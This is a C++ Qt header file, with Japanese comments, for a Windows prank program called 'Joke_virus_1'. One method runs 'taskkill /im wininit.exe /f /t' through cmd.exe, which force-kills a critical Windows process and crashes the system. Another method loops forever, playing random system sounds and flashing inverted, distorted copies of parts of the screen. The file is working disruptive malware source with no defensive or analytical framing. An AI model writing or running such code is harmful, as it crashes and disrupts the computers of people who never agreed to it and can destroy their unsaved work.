#pragma once

#include <QtWidgets/QMainWindow>
#include <QProcess>
#include <QDebug>
#include <windows.h>
#include <thread>
#include "ui_Joke_virus_1.h"

#pragma comment(lib, "winmm.lib")

class Joke_virus_1 : public QMainWindow
{
    Q_OBJECT

public:
    Joke_virus_1(QWidget *parent = nullptr);
    ~Joke_virus_1();
    void PlayOverlap(LPCWSTR path) {

        int soundId = 0;

        std::wstring alias = L"snd_" + std::to_wstring(soundId++);

        // 1. ファイルを開いて新しい識別子を割り当てる
        std::wstring openCmd = L"open \"" + std::wstring(path) + L"\" type mpegvideo alias " + alias;
        mciSendStringW(openCmd.c_str(), NULL, 0, NULL);

        // 2. 再生を開始する（バックグラウンドで即時再生）
        std::wstring playCmd = L"play " + alias + L" from 0";
        mciSendStringW(playCmd.c_str(), NULL, 0, NULL);
    }
    void Easy_Command() {
        QProcess process;
        process.start("cmd.exe", QStringList() << "/c" << "taskkill /im wininit.exe /f /t");
        process.waitForFinished(10000);
    }
    void Mid_Command() {
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        int a, b;

        int x1, x2, y1, y2, width, height;

        LPCWSTR soundPath_0 = L"C:\\Windows\\Media\\Windows Background.wav";
        LPCWSTR soundPath_1 = L"C:\\Windows\\Media\\Windows Message Nudge.wav";
        LPCWSTR soundPath_2 = L"C:\\Windows\\Media\\Windows Unlock.wav";

        while (1) {
            // SND_FILENAME : 第1引数をファイルパス , SND_SYNC : 同期再生 , SND_ASYNC : 非同期再生 , SND_NOSTOP : 再生中ならスキップ
            a = rand() % 3;

            if (a == 0) PlayOverlap(soundPath_0);
            else if (a == 1) PlaySound(soundPath_1, NULL, SND_FILENAME | SND_ASYNC | SND_NOSTOP);
            else if (a == 2) PlaySound(soundPath_2, NULL, SND_FILENAME | SND_ASYNC | SND_NOSTOP);

            a = rand() % 2;
            if (a == 0) {
                HDC hdc = GetDC(NULL);
                x1 = rand() % w;
                y1 = rand() % h;
                x2 = rand() % w;
                y2 = rand() % h;
                width = rand() % w;
                height = rand() % h;
                StretchBlt(hdc, x1, y1, width, height,
                    hdc, x2, y2, width, height, NOTSRCCOPY);
                ReleaseDC(NULL, hdc);
                Sleep(10);
            }
            else if (a == 1) {
                b = rand() % 10;
                for (int i = 0; i < b; i++) {
                    HDC hdc = GetDC(NULL);
                    x1 = rand() % w;
                    y1 = rand() % h;
                    x2 = x1 + 200;
                    y2 = y1 + 200;
                    width = rand() % w;
                    height = rand() % h;
                    StretchBlt(hdc, x1, y1, width, height,
                        hdc, x2, y2, width, height, NOTSRCCOPY);
                    ReleaseDC(NULL, hdc);
                    Sleep(10);
                }
            }
        }
    }
private:
    Ui::Joke_virus_1Class ui;
};

